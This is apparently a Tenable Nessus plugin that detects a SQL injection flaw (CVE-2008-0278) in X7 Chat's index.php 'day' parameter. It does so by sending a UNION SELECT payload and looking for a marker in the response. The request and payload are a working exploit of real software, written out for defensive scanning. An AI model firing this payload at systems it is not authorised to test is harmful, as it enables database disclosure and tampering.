#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(29981);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2008-0278");
  script_bugtraq_id(27277);
  script_osvdb_id(40252);
  script_xref(name:"EDB-ID", value:"4907");

  script_name(english:"X7 Chat index.php day Parameter SQL Injection");
  script_summary(english:"Tries to influence an event listing");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running X7 Chat, a web-based chat program written
in PHP. 

The version of X7 Chat installed on the remote host fails to sanitize
input to the 'day' parameter of the 'index.php' script when 'page' is
set to 'event' before using it in 'sources/info_box.php' to construct
database queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an
attacker may be able to exploit this issue to manipulate database
queries to disclose sensitive information, bypass authentication,
modify data, or even attack the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://x7chat.com/support_forum/index.php?topic=3287.0" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to X7 Chat 2.0.5.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/15");
 script_cvs_date("$Date: 2016/05/19 18:10:51 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/x7chat", "/chat", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate an event listing.
  magic1 = unixtime();
  magic2 = rand();
  exploit = string("-1 UNION SELECT 1,", magic1,",", magic2, " --");

  u = string(
      dir, "/index.php?",
      "act=sm_window&",
      "page=event&",
      "day=", urlencode(str:exploit)
    );
  r = http_send_recv3(method: "GET", port:port, item: u);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our "event".
  if (
    'Powered By <a href="http://www.x7chat.com/' >< res &&
    string(" : </b>", magic2, "<Br><Br>") >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
